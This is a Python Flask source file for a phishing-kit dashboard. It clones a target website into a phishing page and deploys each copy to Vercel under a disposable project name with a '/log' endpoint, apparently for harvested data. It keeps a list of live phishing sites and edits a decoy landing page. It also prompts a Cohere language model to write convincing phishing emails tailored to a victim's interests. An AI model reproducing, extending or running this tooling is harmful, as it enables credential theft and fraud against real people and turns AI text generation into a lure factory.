
from flask import Flask, render_template, request, redirect, url_for, jsonify
import os
import shutil
from dotenv import load_dotenv
from constants import VERCEL_INSTALL_URL

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)

# JSON error handlers
@app.errorhandler(404)
def not_found(e):
    if request.path.startswith('/api/'):
        return jsonify({'error': 'Not found'}), 404
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(e):
    if request.path.startswith('/api/'):
        return jsonify({'error': 'Internal server error'}), 500
    return render_template('500.html'), 500

@app.errorhandler(Exception)
def handle_exception(e):
    if request.path.startswith('/api/'):
        return jsonify({'error': str(e)}), 500
    raise e

# Check for Vercel CLI on startup
vercel_installed = shutil.which("vercel") is not None

@app.route('/')
def index():
    """Main menu page"""
    return render_template('menu.html', vercel_installed=vercel_installed)

@app.route('/my-sites')
def my_sites():
    """View existing phishing sites"""
    import json
    try:
        with open('sites.json', 'r') as f:
            sites = json.load(f)
    except FileNotFoundError:
        sites = []
    return render_template('my_sites.html', sites=sites)

@app.route('/new-site')
def new_site():
    """Create new phishing site page"""
    return render_template('new_site.html')

@app.route('/settings')
def settings():
    """Settings page"""
    try:
        with open('build/templates/unavailable.html', 'r') as f:
            landing_page = f.read()
    except FileNotFoundError:
        landing_page = ""
    return render_template('settings.html', landing_page=landing_page)

@app.route('/api/generate-page', methods=['POST'])
def generate_page():
    """API endpoint to generate phishing page"""
    import engine as eg
    import requests
    from constants import REQ_HEADERS
    
    url = request.json.get('url')
    if not url:
        return jsonify({'error': 'URL is required'}), 400
    
    try:
        # Validate URL
        response = requests.get(url, headers=REQ_HEADERS)
        response.raise_for_status()
        
        # Generate phishing page
        eg.generate_phishing_page(url)
        return jsonify({'success': True, 'message': 'Phishing page generated successfully'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/deploy', methods=['POST'])
def deploy():
    """API endpoint to deploy phishing site"""
    import subprocess
    import json
    from datetime import datetime
    import re
    import time
    import os
    import shutil
    
    try:
        # Delete .vercel directory to force a new project creation
        vercel_dir = 'build/.vercel'
        if os.path.exists(vercel_dir):
            shutil.rmtree(vercel_dir)
        
        # Generate unique project name
        timestamp = str(int(time.time()))
        project_name = f"page-{timestamp}"
        
        # Run Vercel deployment with unique project name
        deploy_cmd = f"vercel deploy --prod --cwd build --yes --name {project_name}"
        result = subprocess.run(
            deploy_cmd,
            shell=True,
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            # Extract the production domain URL from Vercel output
            # Look for lines containing "Production:" or the project name domain
            deployment_url = None
            
            # Try to find the production domain in the output
            for line in result.stdout.split('\n'):
                # Look for the production domain (project-name.vercel.app)
                if 'Production:' in line or project_name in line:
                    # Extract domain URL (without deployment hash)
                    domain_match = re.search(r'https://([a-z0-9-]+\.vercel\.app)(?:\s|$)', line)
                    if domain_match:
                        potential_url = domain_match.group(0).strip()
                        # Make sure it's the domain URL, not deployment URL
                        # Domain URLs don't have the team/user hash suffix
                        if potential_url.count('-') == project_name.count('-') + 1:
                            deployment_url = potential_url
                            break
            
            # Fallback: construct the URL from the project name
            if not deployment_url:
                deployment_url = f"https://{project_name}.vercel.app"
            
            if deployment_url:
                # Save to sites.json
                try:
                    with open('sites.json', 'r') as f:
                        sites = json.load(f)
                except FileNotFoundError:
                    sites = []
                
                site_id = len(sites) + 1
                sites.append({
                    'id': site_id,
                    'url': deployment_url,
                    'log_url': f"{deployment_url}/log",
                    'creation_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'project_name': project_name
                })
                
                with open('sites.json', 'w') as f:
                    json.dump(sites, f, indent=2)
                
                return jsonify({'success': True, 'url': deployment_url})
        
        return jsonify({'error': result.stderr or 'Deployment failed'}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/generate-bait', methods=['POST'])
def generate_bait():
    """API endpoint to generate bait message"""
    import cohere
    import os
    
    interests = request.json.get('interests')
    if not interests:
        return jsonify({'error': 'Interests are required'}), 400
    
    api_key = os.getenv('COHERE_API_KEY')
    if not api_key:
        return jsonify({'error': 'COHERE_API_KEY not set in environment variables'}), 500
    
    try:
        co = cohere.Client(api_key)
        prompt = f"Generate a convincing phishing email message for someone interested in: {interests}. The message should appear legitimate and encourage them to click a link."
        
        response = co.chat(
            model='command-r-08-2024',
            message=prompt,
            max_tokens=300,
            temperature=0.7
        )
        
        message = response.text.strip()
        return jsonify({'success': True, 'message': message})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/delete-site', methods=['POST'])
def delete_site():
    """API endpoint to delete a phishing site"""
    import json
    
    site_id = request.json.get('site_id')
    if not site_id:
        return jsonify({'error': 'Site ID is required'}), 400
    
    try:
        with open('sites.json', 'r') as f:
            sites = json.load(f)
        
        sites = [s for s in sites if str(s['id']) != str(site_id)]
        
        with open('sites.json', 'w') as f:
            json.dump(sites, f, indent=2)
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/update-landing-page', methods=['POST'])
def update_landing_page():
    """API endpoint to update landing page"""
    landing_page = request.json.get('landing_page')
    if not landing_page:
        return jsonify({'error': 'Landing page content is required'}), 400
    
    try:
        with open('build/templates/unavailable.html', 'w') as f:
            f.write(landing_page)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    if not vercel_installed:
        print("⚠️ Vercel CLI is not installed.")
        print(f"➡️ Please install it by following the instructions at: {VERCEL_INSTALL_URL}")
        print("You can install it later by running: npm install -g vercel")
    
    app.debug = True
    app.run(host="0.0.0.0", port=5000)
